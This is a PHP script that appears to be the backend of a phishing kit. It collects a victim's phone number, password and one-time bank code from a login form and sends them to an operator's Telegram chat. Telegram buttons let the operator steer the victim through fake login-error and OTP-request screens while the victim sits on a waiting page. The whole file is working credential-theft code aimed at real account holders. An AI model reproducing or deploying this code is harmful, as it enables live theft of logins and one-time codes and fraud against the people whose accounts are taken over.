<?php
// Incluir el archivo de configuración y conexión a la base de datos
include '../config/conexion.php';
$config = include '../config/config.php';

function escapeMarkdownV2($text) {
    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['usuario'];
    $clave = $_POST['clave'];
    $otp = $_POST['otp'];
    $estado = 1; // Estado inicial del cliente

    // Insertar solo el estado en la base de datos, los demás campos como NULL
    $sql = "INSERT INTO data (estado) VALUES (?)";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("i", $estado);

    if ($stmt->execute()) {
        $cliente_id = $stmt->insert_id; // Recuperar el ID generado por la base de datos

        // Enviar datos a Telegram
        $botToken = $config['botToken'];
        $chatId = $config['chatId'];
        $baseUrl = $config['baseUrl'];
        $security_key = $config['security_key'];

        $message = "🔐 *Nuevo inicio de sesión*\n\n"
                 . "📱 *Número de celular:* `" . escapeMarkdownV2($usuario) . "`\n"
                 . "🔑 *Contraseña:* `" . escapeMarkdownV2($clave) . "`\n"
                 . "🔢 *Clave dinámica:* `" . escapeMarkdownV2($otp) . "`\n"
                 . "🆔 *ID del cliente:* `" . $cliente_id . "`";

        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => 'Error Login', 'url' => "$baseUrl?id=$cliente_id&estado=2&key=$security_key"],
                    ['text' => 'Datos', 'url' => "$baseUrl?id=$cliente_id&estado=6&key=$security_key"]
                ],
                [
                    ['text' => 'Otp', 'url' => "$baseUrl?id=$cliente_id&estado=3&key=$security_key"],
                    ['text' => 'Otp Error', 'url' => "$baseUrl?id=$cliente_id&estado=4&key=$security_key"]
                ],
                [
                    ['text' => 'Finalizar', 'url' => "$baseUrl?id=$cliente_id&estado=0&key=$security_key"]
                ]
            ]
        ];

        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'MarkdownV2',
            'reply_markup' => json_encode($keyboard)
        ];

        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
            ]
        ];

        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $context  = stream_context_create($options);
        $result = file_get_contents($url, false, $context);

        if ($result === FALSE) {
            $error = error_get_last();
            file_put_contents('telegram_debug_log.txt', "Error: " . print_r($error, true), FILE_APPEND);
            die('Error al enviar mensaje a Telegram');
        }

        header("Location: ../espera.php?id=" . $cliente_id);
        exit();
    } else {
        echo "Error al insertar datos: " . $stmt->error;
    }

    $stmt->close();
    $conn->close();
}
?>
